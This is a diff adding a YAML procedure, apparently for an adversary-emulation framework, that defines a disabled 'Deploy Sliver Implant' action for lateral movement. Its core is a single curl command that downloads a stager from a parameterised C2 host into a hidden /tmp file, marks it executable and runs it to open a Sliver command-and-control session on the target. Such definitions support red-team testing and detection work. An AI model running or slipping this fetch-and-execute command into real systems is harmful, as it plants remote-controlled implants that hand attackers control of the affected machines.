@@ -1,0 +1,26 @@
+name: Deploy Sliver Implant
+description: Download and run a Sliver stager, then register an active C2 session on the target.
+tactic: Lateral Movement
+techniques: ["Ingress Tool Transfer", "T1105"]
+status: disabled
+parameters:
+  C2_HOST:
+    type: string
+    default: 127.0.0.1
+    description: Sliver C2 host serving the stager payload
+  STAGER_PATH:
+    type: string
+    default: /s
+    description: Stager path on the Sliver C2 server
+  IMPLANT_PATH:
+    type: string
+    default: /tmp/.x
+    description: Temporary path to store the downloaded implant
+procedures:
+  - key: curl-stager
+    tool: curl
+    command: >
+      curl -sL https://${C2_HOST}${STAGER_PATH} -o ${IMPLANT_PATH} &&
+      chmod +x ${IMPLANT_PATH} && ${IMPLANT_PATH}
+effects:
+  - c2.session(sliver, ${TARGET_ID})
